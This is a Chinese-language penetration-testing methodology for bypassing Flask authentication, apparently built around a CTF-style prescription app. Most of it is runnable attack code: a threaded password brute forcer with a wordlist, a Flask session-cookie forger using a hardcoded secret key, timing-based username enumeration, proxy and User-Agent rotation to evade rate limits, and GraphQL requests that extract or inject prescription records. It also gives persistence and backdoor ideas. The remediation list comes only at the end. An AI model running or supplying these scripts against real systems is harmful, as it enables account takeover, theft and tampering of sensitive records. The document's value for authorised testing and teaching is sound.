# Flask 认证绕过高级攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 Flask 应用认证绕过高级攻击流程，针对存在多重认证缺陷的 Flask 应用进行深度利用。涵盖硬编码凭证、会话伪造、会话固定、暴力破解、时序攻击等组合攻击技术。

## 1.2 适用范围

本文档适用于存在以下特征的 Flask Web 应用：
- 使用 Flask-Login 进行会话管理
- 存在硬编码凭证或密钥
- 登录接口无速率限制
- 无账户锁定机制
- 会话管理存在缺陷
- 使用 HTTP 明文传输

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

Flask 认证绕过高级攻击是指综合利用多种认证缺陷实现未授权访问的技术集合。攻击者可以通过以下一种或多种组合方式绕过认证：

1. **硬编码凭证利用** - 源代码中暴露的默认凭证
2. **会话伪造** - 利用硬编码密钥伪造会话 Cookie
3. **会话固定** - 登录前后会话 ID 不变
4. **暴力破解** - 无速率限制的密码猜测
5. **时序攻击** - 利用响应时间差异枚举用户名
6. **凭证拦截** - HTTP 明文传输窃听

**本质问题**：
- 认证机制设计缺陷
- 密钥/凭证管理不当
- 缺乏防护机制（速率限制、锁定）
- 传输层无加密保护

### 技术细节

**Flask-Login 会话机制**：
```python
# 典型 Flask-Login 配置
from flask import Flask
from flask_login import LoginManager

app = Flask(__name__)
app.secret_key = 'hardcoded_secret'  # 硬编码密钥
login_manager = LoginManager()
login_manager.init_app(app)

# 用户加载回调
@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))
```

**会话 Cookie 结构**：
```
session=<base64_payload>.<timestamp>.<signature>
```

- Payload 包含 `_user_id`、`_fresh` 等字段
- 使用 HMAC-SHA256 签名
- 密钥为 `app.secret_key`

### 常见 CWE 映射

| CWE 编号 | 描述 | 风险等级 |
|---------|------|---------|
| CWE-798 | 使用硬编码凭证 | CRITICAL |
| CWE-259 | 使用硬编码密码 | CRITICAL |
| CWE-307 | 认证机制缺陷（无速率限制） | HIGH |
| CWE-384 | 会话固定 | HIGH |
| CWE-208 | 时序侧信道 | MEDIUM |
| CWE-319 | 明文传输敏感信息 | CRITICAL |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 医疗系统 | 处方管理登录 | 硬编码 admin 凭证、明文密码 |
| 内部管理系统 | 员工门户 | 默认凭证未修改、无速率限制 |
| CTF 靶场 | 挑战平台 | 故意设计的认证缺陷 |
| 开发/测试环境 | 演示应用 | 示例代码直接部署 |
| 小型 Web 应用 | 博客/论坛 | 缺乏安全开发经验 |

## 2.3 漏洞发现方法

### 2.3.1 硬编码凭证检测

**源代码审计**：

```bash
# 搜索硬编码用户和凭证
grep -rn "username.*password" --include="*.py" .
grep -rn "User(" --include="*.py" .
grep -rn "init_db" --include="*.py" .
grep -rn "default.*user" --include="*.py" .
```

**常见硬编码模式**：

```python
# 危险模式 1：数据库初始化时创建默认用户
def init_db():
    admin = User(username='admin', password='!@ED#')
    user = User(username='user', password='user')
    db.session.add(admin)
    db.session.add(user)
    db.session.commit()

# 危险模式 2：配置文件中
# config.py
DEFAULT_ADMIN = 'admin:admin123'
DEFAULT_USER = 'user:password'

# 危险模式 3：注释中暴露
# app.py
# Default login: admin / P@ssw0rd!
```

**自动检测脚本**：

```python
#!/usr/bin/env python3
"""
硬编码凭证检测脚本
扫描 Python 文件中的硬编码凭证模式
"""

import re
import sys
from pathlib import Path

PATTERNS = [
    # username='xxx', password='yyy'
    r"username\s*=\s*['\"]([^'\"]+)['\"].*password\s*=\s*['\"]([^'\"]+)['\"]",
    # User('xxx', 'yyy')
    r"User\s*\(\s*['\"]([^'\"]+)['\"]\s*,\s*['\"]([^'\"]+)['\"]",
    # 'admin':'password'
    r"['\"]admin['\"]\s*:\s*['\"]([^'\"]+)['\"]",
    # default_password = 'xxx'
    r"default[_]?password\s*=\s*['\"]([^'\"]+)['\"]",
]

def scan_file(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read()

        for pattern in PATTERNS:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                line_num = content[:match.start()].count('\n') + 1
                print(f"[+] Found credential at {filepath}:{line_num}")
                print(f"    Match: {match.group(0)[:100]}")
                if len(match.groups()) >= 2:
                    print(f"    Username: {match.group(1)}, Password: {match.group(2)}")
    except Exception as e:
        pass  # 跳过无法读取的文件

def scan_directory(directory):
    for py_file in Path(directory).rglob('*.py'):
        scan_file(py_file)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python scan_credentials.py <directory>")
        sys.exit(1)
    scan_directory(sys.argv[1])
```

### 2.3.2 硬编码密钥检测

```bash
# 搜索 Flask secret_key
grep -rn "secret_key" --include="*.py" .
grep -rn "SECRET_KEY" --include="*.py" .
grep -rn "app.config\['SECRET_KEY'\]" --include="*.py" .

# 搜索 JWT 密钥
grep -rn "JWT_SECRET" --include="*.py" .
grep -rn "jwt.*key" --include="*.py" .
```

**常见模式**：

```python
# 危险模式 1：简单字符串密钥
app.secret_key = '@#$%^R&GYUIUBJIU#@*DF&G*H'
app.secret_key = 'flask_secret_key'

# 危险模式 2：配置文件
app.config['SECRET_KEY'] = 'hardcoded-value'

# 危险模式 3：环境变量未设置时使用默认值
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev_secret_key')
```

### 2.3.3 速率限制检测

**手动测试**：

```bash
# 使用脚本快速发送多个登录请求
for i in {1..100}; do
    curl -X POST http://target.com/login \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"wrong"}' &
done
wait

# 观察是否有任何请求被限制（HTTP 429）
# 或响应时间是否一致（无延迟）
```

**自动化检测脚本**：

```python
#!/usr/bin/env python3
"""
速率限制检测脚本
测试登录接口是否存在速率限制
"""

import requests
import time
import statistics

def test_rate_limiting(target_url, username='admin', max_attempts=100):
    """测试速率限制"""
    times = []
    status_codes = []

    print(f"[*] Testing rate limiting on {target_url}")
    print(f"[*] Sending {max_attempts} login attempts...")

    for i in range(max_attempts):
        start = time.time()
        response = requests.post(
            target_url,
            json={'username': username, 'password': f'wrong{i}'}
        )
        elapsed = (time.time() - start) * 1000  # ms

        times.append(elapsed)
        status_codes.append(response.status_code)

        if response.status_code == 429:
            print(f"[!] Rate limited at attempt {i+1}")
            return True

        if i % 10 == 0:
            print(f"[*] Attempt {i}/{max_attempts}, Avg: {statistics.mean(times):.2f}ms")

    # 分析结果
    print(f"\n[*] Results:")
    print(f"    Total requests: {len(status_codes)}")
    print(f"    Average response time: {statistics.mean(times):.2f}ms")
    print(f"    Min: {min(times):.2f}ms, Max: {max(times):.2f}ms")
    print(f"    Status codes: {set(status_codes)}")

    if 429 in status_codes:
        print("[!] Rate limiting detected (HTTP 429)")
        return True
    elif max(times) > min(times) * 10:
        print("[!] Possible rate limiting (response time variance)")
        return True
    else:
        print("[-] No rate limiting detected")
        return False

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python test_rate_limit.py <login_url>")
        sys.exit(1)
    test_rate_limiting(sys.argv[1])
```

### 2.3.4 账户锁定检测

```python
#!/usr/bin/env python3
"""
账户锁定检测脚本
测试多次失败登录后账户是否被锁定
"""

import requests

def test_account_lockout(target_url, username='admin', max_attempts=20):
    """测试账户锁定机制"""
    print(f"[*] Testing account lockout for user '{username}'")

    for i in range(max_attempts):
        response = requests.post(
            target_url,
            json={'username': username, 'password': f'wrong_password_{i}'}
        )

        # 检查锁定相关消息
        response_text = response.text.lower()
        if any(keyword in response_text for keyword in ['locked', 'suspended', 'too many', 'try later']):
            print(f"[!] Account lockout detected at attempt {i+1}")
            print(f"    Response: {response.text[:100]}")
            return True

        if i % 5 == 0:
            print(f"[*] Attempt {i+1}: HTTP {response.status_code}")

    # 验证账户是否仍然可用
    print("[*] Verifying account is still accessible...")
    # 这里可以使用正确的密码测试（如果已知）
    print("[-] No account lockout detected")
    return False

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python test_lockout.py <login_url>")
        sys.exit(1)
    test_account_lockout(sys.argv[1])
```

### 2.3.5 时序攻击检测

```python
#!/usr/bin/env python3
"""
时序攻击检测脚本
通过响应时间差异枚举有效用户名
"""

import requests
import time
import statistics

def measure_login_time(target_url, username, password='wrongpassword', samples=50):
    """测量登录请求的平均响应时间"""
    times = []

    for _ in range(samples):
        start = time.perf_counter()
        requests.post(
            target_url,
            json={'username': username, 'password': password}
        )
        elapsed = (time.perf_counter() - start) * 1000  # ms
        times.append(elapsed)

    return statistics.mean(times), statistics.median(times)

def enumerate_users(target_url, username_list):
    """通过时序分析枚举有效用户名"""
    print(f"[*] Performing timing attack on {target_url}")
    print(f"[*] Testing {len(username_list)} usernames with 50 samples each\n")

    results = {}
    for username in username_list:
        mean, median = measure_login_time(target_url, username)
        results[username] = {'mean': mean, 'median': median}
        print(f"    {username}: mean={mean:.3f}ms, median={median:.3f}ms")

    # 分析结果
    mean_times = [r['mean'] for r in results.values()]
    threshold = statistics.mean(mean_times) + statistics.stdev(mean_times)

    print(f"\n[*] Analysis:")
    print(f"    Average response time: {statistics.mean(mean_times):.3f}ms")
    print(f"    Threshold (mean + 1σ): {threshold:.3f}ms")

    valid_users = [u for u, r in results.items() if r['mean'] > threshold]
    if valid_users:
        print(f"[+] Potential valid users (slower responses): {valid_users}")
    else:
        print("[-] No significant timing differences detected")

    return results

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python timing_attack.py <login_url> [usernames...]")
        sys.exit(1)

    target_url = sys.argv[1]
    usernames = sys.argv[2:] if len(sys.argv) > 2 else ['admin', 'user', 'test', 'notauser']
    enumerate_users(target_url, usernames)
```

### 2.3.6 会话固定检测

```python
#!/usr/bin/env python3
"""
会话固定检测脚本
测试登录前后会话 ID 是否变化
"""

import requests

def test_session_fixation(target_url):
    """测试会话固定漏洞"""
    session = requests.Session()

    # 1. 获取登录前的会话 Cookie
    print("[*] Getting pre-authentication session cookie...")
    session.get(target_url)
    pre_login_cookie = session.cookies.get('session')
    print(f"    Pre-login session: {pre_login_cookie[:50]}...")

    # 2. 执行登录
    print("[*] Attempting login...")
    login_response = session.post(
        f"{target_url}/login",
        json={'username': 'admin', 'password': '!@ED#'}
    )

    # 3. 检查登录后的会话 Cookie
    post_login_cookie = session.cookies.get('session')
    print(f"    Post-login session: {post_login_cookie[:50]}...")

    # 4. 比较 Cookie 是否相同
    if pre_login_cookie == post_login_cookie:
        print("[!] VULNERABLE: Session ID unchanged after login (Session Fixation)")
        return True
    else:
        print("[-] Session ID changed after login (secure)")
        return False

    # 5. 验证会话是否有效
    if post_login_cookie:
        profile_response = session.get(f"{target_url}/profile")
        if profile_response.status_code == 200:
            print("[+] Session is valid and authenticated")

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python session_fixation.py <base_url>")
        sys.exit(1)
    test_session_fixation(sys.argv[1])
```

## 2.4 漏洞利用方法

### 2.4.1 硬编码凭证直接利用

**前提条件**：
- 已从源代码或配置中获取硬编码凭证

**利用步骤**：

```bash
# 1. 使用硬编码凭证登录
curl -X POST http://localhost:5003/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "!@ED#"}'

# 预期响应：
# {"message": "Login successful", "userID": 1}

# 2. 提取会话 Cookie
# 从响应头获取 Set-Cookie: session=xxx

# 3. 使用会话 Cookie 访问受保护资源
curl -b "session=<cookie_value>" \
  http://localhost:5003/view_prescriptions

# 4. 访问管理功能
curl -b "session=<cookie_value>" \
  http://localhost:5003/add_prescription
```

**Python 自动化脚本**：

```python
#!/usr/bin/env python3
"""
硬编码凭证利用脚本
使用已知凭证登录并访问受保护资源
"""

import requests
import json

def login_with_credentials(base_url, username, password):
    """使用凭证登录并获取会话"""
    login_url = f"{base_url}/login"

    response = requests.post(
        login_url,
        json={'username': username, 'password': password}
    )

    if response.status_code == 200:
        print(f"[+] Login successful for user '{username}'")
        user_id = response.json().get('userID')
        session_cookie = response.cookies.get('session')
        return session_cookie, user_id
    else:
        print(f"[-] Login failed: {response.text}")
        return None, None

def access_protected_resource(base_url, session_cookie, endpoint):
    """使用会话访问受保护资源"""
    url = f"{base_url}{endpoint}"
    response = requests.get(
        url,
        cookies={'session': session_cookie}
    )
    return response

def main():
    base_url = "http://localhost:5003"

    # 硬编码凭证列表
    credentials = [
        ('admin', '!@ED#'),
        ('user', 'user'),
    ]

    for username, password in credentials:
        print(f"\n[*] Trying credentials: {username}:{password}")
        session_cookie, user_id = login_with_credentials(base_url, username, password)

        if session_cookie:
            print(f"[+] Session cookie: {session_cookie[:50]}...")

            # 访问受保护资源
            endpoints = ['/view_prescriptions', '/add_prescription', '/logout']
            for endpoint in endpoints:
                response = access_protected_resource(base_url, session_cookie, endpoint)
                print(f"    {endpoint}: HTTP {response.status_code}")

if __name__ == '__main__':
    main()
```

### 2.4.2 Flask 会话伪造攻击

**前提条件**：
- 已获取 Flask 应用的硬编码密钥

**利用步骤**：

```python
#!/usr/bin/env python3
"""
Flask 会话伪造攻击脚本
使用硬编码密钥伪造任意用户的会话 Cookie
"""

from itsdangerous import URLSafeTimedSerializer
import requests

def forge_flask_session(secret_key, user_id, additional_data=None):
    """伪造 Flask 会话 Cookie"""
    serializer = URLSafeTimedSerializer(
        secret_key=secret_key,
        salt='cookie-session'  # Flask 默认 salt
    )

    session_data = {'_user_id': str(user_id), '_fresh': True}
    if additional_data:
        session_data.update(additional_data)

    return serializer.dumps(session_data)

def test_session(base_url, session_cookie, test_endpoint='/view_prescriptions'):
    """测试伪造的会话是否有效"""
    response = requests.get(
        f"{base_url}{test_endpoint}",
        cookies={'session': session_cookie}
    )
    return response.status_code == 200, response.text

def main():
    base_url = "http://localhost:5003"

    # 硬编码密钥（从源代码获取）
    secret_key = '@#$%^R&GYUIUBJIU#@*DF&G*H'

    print(f"[*] Forging session cookies using secret key: {secret_key[:10]}...")

    # 伪造管理员会话（user_id=1）
    admin_session = forge_flask_session(secret_key, user_id=1)
    print(f"\n[*] Forged admin session: {admin_session}")

    # 测试会话
    success, content = test_session(base_url, admin_session)
    if success:
        print("[+] Admin session forgery successful!")
        # 检查是否看到管理员页面
        if "admin" in content.lower():
            print("[+] Confirmed: Accessing admin's data")
    else:
        print("[-] Session forgery failed")

    # 遍历用户 ID 枚举所有用户
    print("\n[*] Enumerating users...")
    for user_id in range(1, 10):
        session = forge_flask_session(secret_key, user_id)
        success, content = test_session(base_url, session, '/view_prescriptions')
        if success:
            print(f"[+] Valid user ID: {user_id}")

if __name__ == '__main__':
    main()
```

### 2.4.3 暴力破解攻击

**前提条件**：
- 登录接口无速率限制
- 已知有效用户名

**利用脚本**：

```python
#!/usr/bin/env python3
"""
暴力破解攻击脚本
针对无速率限制的登录接口进行密码爆破
"""

import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

def brute_force_login(target_url, username, password_list, max_attempts=None, threads=10):
    """暴力破解登录"""

    def try_password(password):
        try:
            response = requests.post(
                target_url,
                json={'username': username, 'password': password},
                timeout=5
            )
            return password, response.status_code, response.text
        except Exception as e:
            return password, 0, str(e)

    print(f"[*] Starting brute force attack on {target_url}")
    print(f"[*] Target username: {username}")
    print(f"[*] Password list size: {len(password_list)}")
    print(f"[*] Using {threads} threads\n")

    start_time = time.time()
    attempts = 0

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(try_password, pwd): pwd for pwd in password_list}

        for future in as_completed(futures):
            password, status_code, response_text = future.result()
            attempts += 1

            # 检查成功登录
            if status_code == 200 and 'success' in response_text.lower():
                elapsed = time.time() - start_time
                print(f"\n[+] PASSWORD FOUND: {password}")
                print(f"[+] Attempts: {attempts}")
                print(f"[+] Time: {elapsed:.2f}s")
                print(f"[+] Speed: {attempts/elapsed:.2f} attempts/sec")
                return password

            # 进度显示
            if attempts % 100 == 0:
                elapsed = time.time() - start_time
                speed = attempts / elapsed if elapsed > 0 else 0
                print(f"[*] Attempt {attempts}, Speed: {speed:.2f} pwd/s", end='\r')

            if max_attempts and attempts >= max_attempts:
                break

    elapsed = time.time() - start_time
    print(f"\n[-] Password not found after {attempts} attempts ({elapsed:.2f}s)")
    return None

def load_password_list(filepath):
    """加载密码字典"""
    with open(filepath, 'r') as f:
        return [line.strip() for line in f if line.strip()]

if __name__ == '__main__':
    import sys

    if len(sys.argv) < 4:
        print("Usage: python bruteforce.py <login_url> <username> <password_list.txt>")
        sys.exit(1)

    target_url = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]

    passwords = load_password_list(password_file)
    brute_force_login(target_url, username, passwords)
```

**常用密码字典**：

```
# 常见弱密码列表
password
123456
admin
admin123
password123
qwerty
letmein
welcome
monkey
dragon
master
!@ED#
user
test
root
```

### 2.4.4 时序攻击用户名枚举

**前提条件**：
- 登录流程对有效/无效用户有不同处理逻辑
- 响应时间差异可测量

**利用脚本**：

```python
#!/usr/bin/env python3
"""
时序攻击用户名枚举脚本
通过响应时间差异识别有效用户名
"""

import requests
import time
import statistics
from concurrent.futures import ThreadPoolExecutor

class TimingAttack:
    def __init__(self, target_url, samples=100):
        self.target_url = target_url
        self.samples = samples

    def measure_time(self, username, password='invalid'):
        """测量登录请求时间"""
        times = []
        for _ in range(self.samples):
            start = time.perf_counter()
            try:
                requests.post(
                    self.target_url,
                    json={'username': username, 'password': password},
                    timeout=10
                )
            except:
                pass
            elapsed = (time.perf_counter() - start) * 1000
            times.append(elapsed)
        return statistics.mean(times)

    def enumerate_users(self, username_list):
        """枚举有效用户名"""
        print(f"[*] Testing {len(username_list)} usernames...")
        results = {}

        for username in username_list:
            avg_time = self.measure_time(username)
            results[username] = avg_time
            print(f"    {username}: {avg_time:.3f}ms")

        # 识别有效用户（响应时间较长）
        times = list(results.values())
        threshold = statistics.mean(times) + statistics.stdev(times)

        valid_users = [u for u, t in results.items() if t > threshold]

        print(f"\n[*] Threshold: {threshold:.3f}ms")
        if valid_users:
            print(f"[+] Valid users: {valid_users}")
        else:
            print("[-] No valid users identified")

        return valid_users

if __name__ == '__main__':
    import sys

    if len(sys.argv) < 2:
        print("Usage: python timing_enum.py <login_url> [usernames...]")
        sys.exit(1)

    target_url = sys.argv[1]
    usernames = sys.argv[2:] if len(sys.argv) > 2 else [
        'admin', 'administrator', 'user', 'test',
        'root', 'guest', 'notauser', 'invalid'
    ]

    attack = TimingAttack(target_url, samples=50)
    attack.enumerate_users(usernames)
```

### 2.4.5 组合攻击流程

**完整攻击脚本**：

```python
#!/usr/bin/env python3
"""
Flask 认证绕过组合攻击脚本
综合运用多种技术实现认证绕过
"""

import requests
import json
from itsdangerous import URLSafeTimedSerializer

class FlaskAuthAttacker:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.secret_key = None
        self.valid_credentials = []

    def scan_hardcoded_credentials(self):
        """扫描常见硬编码凭证"""
        print("[*] Scanning for hardcoded credentials...")

        # 常见凭证列表
        credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('admin', '!@ED#'),
            ('user', 'user'),
            ('test', 'test'),
        ]

        for username, password in credentials:
            response = self.session.post(
                f"{self.base_url}/login",
                json={'username': username, 'password': password}
            )
            if response.status_code == 200:
                print(f"[+] Found credentials: {username}:{password}")
                self.valid_credentials.append((username, password))

        return len(self.valid_credentials) > 0

    def forge_session(self, secret_key, user_id=1):
        """伪造会话 Cookie"""
        print(f"[*] Forging session for user_id={user_id}")

        serializer = URLSafeTimedSerializer(
            secret_key=secret_key,
            salt='cookie-session'
        )

        forged_cookie = serializer.dumps({'_user_id': str(user_id), '_fresh': True})
        return forged_cookie

    def access_api_without_auth(self):
        """测试 API 是否无需认证"""
        print("[*] Testing API authentication requirement...")

        # 尝试直接访问 GraphQL API
        response = self.session.post(
            f"{self.base_url}/api",
            json={'query': '{ getPrescriptions(userId: 1) { id } }'}
        )

        if response.status_code == 200:
            print("[+] API accessible without authentication!")
            return True
        else:
            print("[-] API requires authentication")
            return False

    def exploit_idor(self, user_id):
        """利用 IDOR 漏洞"""
        print(f"[*] Exploiting IDOR for user_id={user_id}")

        response = self.session.post(
            f"{self.base_url}/api",
            json={'query': f'{{ getPrescriptions(userId: {user_id}) {{ id prescriptionDetails flag }} }}'}
        )

        if response.status_code == 200:
            data = response.json()
            if 'data' in data and 'getPrescriptions' in data['data']:
                prescriptions = data['data']['getPrescriptions']
                print(f"[+] Retrieved {len(prescriptions)} prescriptions")

                # 查找 flag
                for p in prescriptions:
                    if p.get('flag'):
                        print(f"[+] FLAG FOUND: {p['flag']}")
                        return p['flag']

        return None

    def run_full_attack(self, secret_key=None):
        """执行完整攻击流程"""
        print(f"[*] Starting full attack on {self.base_url}\n")

        # 1. 尝试硬编码凭证
        if self.scan_hardcoded_credentials():
            print("[+] Using hardcoded credentials for access\n")
            return self.valid_credentials[0]

        # 2. 测试 API 无需认证
        if self.access_api_without_auth():
            print("[+] Exploiting unauthenticated API access\n")
            # 枚举用户 ID
            for user_id in range(1, 10):
                flag = self.exploit_idor(user_id)
                if flag:
                    return flag

        # 3. 使用会话伪造
        if secret_key:
            print("[+] Using session forgery\n")
            forged_cookie = self.forge_session(secret_key, user_id=1)
            self.session.cookies.set('session', forged_cookie)

            response = self.session.get(f"{self.base_url}/view_prescriptions")
            if response.status_code == 200:
                print("[+] Session forgery successful")
                return "Session forged successfully"

        print("[-] Attack completed")
        return None

if __name__ == '__main__':
    import sys

    if len(sys.argv) < 2:
        print("Usage: python flask_attack.py <base_url> [secret_key]")
        sys.exit(1)

    base_url = sys.argv[1]
    secret_key = sys.argv[2] if len(sys.argv) > 2 else None

    attacker = FlaskAuthAttacker(base_url)
    result = attacker.run_full_attack(secret_key)

    if result:
        print(f"\n[+] Attack result: {result}")
```

## 2.5 漏洞利用绕过方法

### 2.5.1 WAF 绕过

**IP 速率限制绕过**：

```python
# 使用代理池轮换 IP
import requests
from itertools import cycle

proxies = [
    'http://proxy1:8080',
    'http://proxy2:8080',
    'http://proxy3:8080',
]

proxy_pool = cycle(proxies)

def rotate_proxy_request(url, data):
    proxy = next(proxy_pool)
    response = requests.post(url, json=data, proxies={'http': proxy, 'https': proxy})
    return response
```

**User-Agent 轮换**：

```python
import random

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
]

headers = {'User-Agent': random.choice(user_agents)}
response = requests.post(url, json=data, headers=headers)
```

### 2.5.2 会话检测绕过

**Cookie 指纹绕过**：

```python
# 如果应用使用额外的 Cookie 指纹验证
# 需要同时伪造所有相关 Cookie

def forge_complete_session(secret_key, user_id):
    serializer = URLSafeTimedSerializer(secret_key, salt='cookie-session')

    # 伪造主会话 Cookie
    session_cookie = serializer.dumps({
        '_user_id': str(user_id),
        '_fresh': True,
        '_id': 'random_session_id'
    })

    # 可能需要伪造的其他 Cookie
    csrf_token = serializer.dumps({'csrf_token': 'random_value'})

    return {
        'session': session_cookie,
        'csrf_token': csrf_token
    }
```

## 2.6 后渗透利用

### 2.6.1 敏感数据提取

```bash
# 提取所有用户处方数据
curl -X POST http://localhost:5003/api \
  -H "Content-Type: application/json" \
  -d '{"query": "{ getPrescriptions(userId: 1) { id prescriptionDetails flag } }"}'

# 遍历所有用户 ID
for i in {1..100}; do
    curl -s -X POST http://localhost:5003/api \
      -H "Content-Type: application/json" \
      -d "{\"query\": \"{ getPrescriptions(userId: $i) { id } }\"}" \
      | grep -q "data" && echo "User $i exists"
done
```

### 2.6.2 数据篡改

```bash
# 注入恶意处方
curl -X POST http://localhost:5003/api \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { addPrescription(userId: 1, prescriptionDetails: \"MALICIOUS_INJECTION\") { prescription { id } } }"}'
```

### 2.6.3 权限维持

```python
# 创建持久化访问
# 1. 记录硬编码凭证和密钥
# 2. 创建多个会话 Cookie 备用
# 3. 如有数据库访问，创建后门账户

def create_backdoor_user(base_url, admin_session):
    """创建后门用户（如果应用支持注册）"""
    # 实现取决于具体应用功能
    pass
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 目标 | Payload | 说明 |
|-----|---------|------|
| 默认 admin 凭证 | `admin:!@ED#` | 常见硬编码凭证 |
| 默认 user 凭证 | `user:user` | 常见硬编码凭证 |
| Flask 会话伪造 | `{'_user_id': '1'}` | 伪造管理员会话 |
| GraphQL 查询 | `{ getPrescriptions(userId: 1) { id } }` | 未授权数据访问 |
| GraphQL 突变 | `mutation { addPrescription(...) }` | 未授权数据写入 |
| 暴力破解 | 常见密码字典 | 无速率限制爆破 |
| 时序攻击 | 50+ 样本/用户 | 识别有效用户名 |

## 3.2 工具推荐

| 工具 | 用途 | 安装 |
|-----|------|------|
| itsdangerous | Flask 会话编解码 | `pip install itsdangerous` |
| Flask-Unsign | Flask Cookie 工具 | `pip install flask-unsign` |
| Burp Suite | Web 渗透测试 | https://portswigger.net |
| Hydra | 暴力破解工具 | `apt install hydra` |
| SQLMap | SQL 注入工具 | `pip install sqlmap` |

## 3.3 修复建议

1. **移除硬编码凭证** - 使用环境变量或密钥管理系统
2. **实施速率限制** - 使用 Flask-Limiter 限制登录尝试
3. **添加账户锁定** - 多次失败后临时锁定账户
4. **会话 ID 轮换** - 登录后生成新会话 ID
5. **启用 HTTPS** - 强制 TLS 加密传输
6. **密码哈希存储** - 使用 bcrypt/argon2 哈希密码
7. **添加 MFA** - 实施多因素认证
8. **统一响应时间** - 防止时序攻击
